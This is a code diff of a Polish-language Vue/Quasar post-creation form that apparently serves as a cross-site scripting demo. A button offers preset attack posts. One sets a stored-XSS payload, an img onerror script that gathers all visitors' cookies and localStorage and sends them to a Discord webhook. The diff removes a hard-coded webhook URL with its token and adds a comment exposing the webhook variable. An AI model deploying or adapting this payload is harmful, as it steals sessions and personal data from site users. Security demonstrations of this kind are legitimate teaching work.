@@ -5,15 +5,12 @@
       <q-card-section>
         <div class="text-h6">Dodaj nowy post</div>
 
+        <!-- {{ process.env.WEBHOOK_URL }} -->
         <div class="q-pa-md q-gutter-sm">
 
-        <q-input v-model="newPost.title" label="Tytuł" :rules="[val => !!val || 'Tytuł jest wymagany']"  />
+          <q-input v-model="newPost.title" label="Tytuł" :rules="[val => !!val || 'Tytuł jest wymagany']" />
 
-        <q-editor
-          v-model="newPost.content"
-          :dense="$q.screen.lt.md"
-          placeholder="Treść posta"
-          :toolbar="[
+          <q-editor v-model="newPost.content" :dense="$q.screen.lt.md" placeholder="Treść posta" :toolbar="[
             [
               {
                 label: $q.lang.editor.align,
@@ -87,8 +84,7 @@
 
             ['undo', 'redo'],
             ['viewsource']
-          ]"
-          :fonts="{
+          ]" :fonts="{
             arial: 'Arial',
             arial_black: 'Arial Black',
             comic_sans: 'Comic Sans MS',
@@ -97,47 +93,46 @@
             lucida_grande: 'Lucida Grande',
             times_new_roman: 'Times New Roman',
             verdana: 'Verdana'
-          }"
-        />
+          }" />
 
 
-        <q-btn label="Importuj kod do ataku ataku">
-           <q-menu>
-            <q-list style="max-width: 360px;">
-              <q-item clickable @click="setNewPostContent1()">
-                <q-item-section side>
-                  <q-badge>1</q-badge>
-                </q-item-section>
-                <q-item-section >
-                  Zmień widok wszystkich użytkowników strony
-                </q-item-section>
-              </q-item>
+          <q-btn label="Importuj kod do ataku ataku">
+            <q-menu>
+              <q-list style="max-width: 360px;">
+                <q-item clickable @click="setNewPostContent1()">
+                  <q-item-section side>
+                    <q-badge>1</q-badge>
+                  </q-item-section>
+                  <q-item-section>
+                    Zmień widok wszystkich użytkowników strony
+                  </q-item-section>
+                </q-item>
 
-              <q-separator />
+                <q-separator />
 
-              <q-item clickable @click="setNewPostContent2()">
-                <q-item-section side>
-                  <q-badge>2</q-badge>
-                </q-item-section>
-                <q-item-section >
-                  Wyślij request od wszystkich użytkowników na inną domene
-                </q-item-section>
-              </q-item>
+                <q-item clickable @click="setNewPostContent2()">
+                  <q-item-section side>
+                    <q-badge>2</q-badge>
+                  </q-item-section>
+                  <q-item-section>
+                    Wyślij request od wszystkich użytkowników na inną domene
+                  </q-item-section>
+                </q-item>
 
-              <q-separator />
+                <q-separator />
 
-              <q-item clickable @click="setNewPostContent3()">
-                <q-item-section side>
-                  <q-badge>3</q-badge>
-                </q-item-section>
-                <q-item-section >
-                  Ukradnij ciastka i local storage wszystkich użytkowników i wyślij go na discorda atakującego
-                </q-item-section>
-              </q-item>
-            </q-list>
-          </q-menu>
-        </q-btn>
-       
+                <q-item clickable @click="setNewPostContent3()">
+                  <q-item-section side>
+                    <q-badge>3</q-badge>
+                  </q-item-section>
+                  <q-item-section>
+                    Ukradnij ciastka i local storage wszystkich użytkowników i wyślij go na discorda atakującego
+                  </q-item-section>
+                </q-item>
+              </q-list>
+            </q-menu>
+          </q-btn>
+
         </div>
       </q-card-section>
 
@@ -151,7 +146,6 @@
 
 <script setup lang="ts">
 import { Notify } from 'quasar';
-import axios from 'axios';
 import { ref } from 'vue';
 import { api } from 'src/boot/axios';
 
@@ -161,7 +155,7 @@ const showModal = defineModel<boolean>();
 
 const addPost = async () => {
   try {
-    await api.post('/posts', {...newPost.value, isNew: true }, {
+    await api.post('/posts', { ...newPost.value, isNew: true }, {
       withCredentials: true
     });
     newPost.value = { title: '', content: '' }; // Reset formularza
@@ -187,7 +181,7 @@ const setNewPostContent2 = () => {
 
 const setNewPostContent3 = () => {
   newPost.value.title = 'Dzięki za dane ;)'
-  newPost.value.content = '<img src="xd" onerror="const webhookUrl = \'https://discord.com/api/webhooks/1333932771269410826/9z92ujGV8SQMAlMSJaymyUKdbXitrv8ozdydq986rP8ntq2_GFaaNP_r_IsjC4xYD2fj\'; const getCookiesList = () => { const cookies = document.cookie.split(\';\'); return cookies.map(cookie => cookie.trim()).join(\'\\n\'); }; const getLocalStorageList = () => { const localStorageData = Object.entries(localStorage); return localStorageData.map(([key, value]) => `${key}: ${value}`).join(\'\\n\'); }; const messageContent = `\\n ------- \\n **Cookies:**\\n${getCookiesList()}\\n\\n**LocalStorage:**\\n${getLocalStorageList()}\\n ------- \\n`; const sendToDiscord = async () => { const body = JSON.stringify({ content: messageContent }); try { const response = await fetch(webhookUrl, { method: \'POST\', headers: { \'Content-Type\': \'application/json\' }, body: body }); if (response.ok) { console.log(\'Wiadomość została wysłana!\'); } else { console.error(\'Wystąpił błąd podczas wysyłania wiadomości:\', response.status); } } catch (error) { console.error(\'Błąd:\', error); } }; sendToDiscord();" />';
+  newPost.value.content = '<img src="xd" onerror="const webhookUrl = \'' + process.env.WEBHOOK_URL + '\'; const getCookiesList = () => { const cookies = document.cookie.split(\';\'); return cookies.map(cookie => cookie.trim()).join(\'\\n\'); }; const getLocalStorageList = () => { const localStorageData = Object.entries(localStorage); return localStorageData.map(([key, value]) => `${key}: ${value}`).join(\'\\n\'); }; const messageContent = `\\n ------- \\n **Cookies:**\\n${getCookiesList()}\\n\\n**LocalStorage:**\\n${getLocalStorageList()}\\n ------- \\n`; const sendToDiscord = async () => { const body = JSON.stringify({ content: messageContent }); try { const response = await fetch(webhookUrl, { method: \'POST\', headers: { \'Content-Type\': \'application/json\' }, body: body }); if (response.ok) { console.log(\'Wiadomość została wysłana!\'); } else { console.error(\'Wystąpił błąd podczas wysyłania wiadomości:\', response.status); } } catch (error) { console.error(\'Błąd:\', error); } }; sendToDiscord();" />';
 }
 
 </script>
